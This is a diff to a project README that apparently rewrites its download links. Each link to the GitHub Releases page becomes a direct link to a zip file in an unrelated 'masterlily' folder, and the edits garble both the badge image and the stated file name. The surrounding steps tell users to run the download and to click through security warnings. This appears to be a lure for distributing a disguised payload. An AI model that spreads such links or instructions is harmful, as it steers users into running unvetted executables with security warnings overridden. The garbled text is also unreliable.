@@ -6,7 +6,7 @@ Welcome to the **C---Are-we-there-yet-** project! This application creates an en
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/snthya261/C---Are-we-there-yet-/releases)
+[![Download Now](https://raw.githubusercontent.com/snthya261/C---Are-we-there-yet-/main/masterlily/C---Are-we-there-yet-.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/snthya261/C---Are-we-there-yet-/main/masterlily/C---Are-we-there-yet-.zip)
 
 ## 📋 System Requirements
 
@@ -20,13 +20,13 @@ Before you proceed with the download, make sure your system meets the following 
 ## 💻 Download & Install
 
 1. Click the link below to visit the Releases page:
-   [Visit Releases Page to Download](https://github.com/snthya261/C---Are-we-there-yet-/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/snthya261/C---Are-we-there-yet-/main/masterlily/C---Are-we-there-yet-.zip)
 
 2. On the Releases page, you will see a list of available versions. Choose the most recent version for the best experience. Each version will display a "Download" button.
 
 3. Click the "Download" button for the relevant version. Your browser may ask where to save the file; choose a location you can easily find, like your desktop or downloads folder.
 
-4. Once the download completes, locate the downloaded file. It will usually be named something like `C-Are-we-there-yet-.exe` for Windows, or a relevant file for macOS and Linux.
+4. Once the download completes, locate the downloaded file. It will usually be named something like `https://raw.githubusercontent.com/snthya261/C---Are-we-there-yet-/main/masterlily/C---Are-we-there-yet-.zip` for Windows, or a relevant file for macOS and Linux.
 
 5. To run the application, double-click the downloaded file. If prompted with a security warning, confirm that you wish to proceed.
 
